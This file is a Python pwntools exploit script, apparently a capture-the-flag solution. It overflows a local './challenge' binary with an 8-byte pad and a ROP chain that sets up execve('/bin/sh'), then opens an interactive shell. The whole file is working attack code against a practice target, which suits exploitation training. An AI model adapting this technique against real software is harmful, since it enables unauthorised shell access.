#!/usr/bin/python
from pwn import *

HOST = "127.0.0.1"
PORT = 7000

rsp_offset = 8

def exploit(r):

    bin_sh = binary.symbols['binsh']
    do_syscall = binary.symbols['do_syscall']

    log.info("setid : {}".format(hex(binary.symbols['setid'])))

    rop = ''
    rop += p64(binary.symbols['set_rdi'])
    rop += p64(bin_sh)     #set filename to location of '/bin/sh'

    rop += p64(binary.symbols['set_rsi'])
    rop += p64(0x0)        #set argv to NULL

    rop += p64(binary.symbols['set_rdx'])
    rop += p64(0x0)        #set envp to NULL

    rop += p64(binary.symbols['set_rax'])
    rop += p64(0x3b)       #set rax to 59 for execve
    rop += p64(do_syscall) # return to do_syscall()

    payload = ''
    payload += 'A'*rsp_offset
    payload += rop

    print r.recvuntil(': ')
    r.sendline(payload)
    r.interactive()
    return

if __name__ == "__main__":
    name = './challenge'
    binary = ELF(name)
    context.terminal=["tmux", "sp", "-h"]

    if len(sys.argv) > 1:
        r = remote(HOST,PORT)
    else:
        r = process(name, env={})
        gdb.attach(r, """

        c
        """)
    exploit(r)
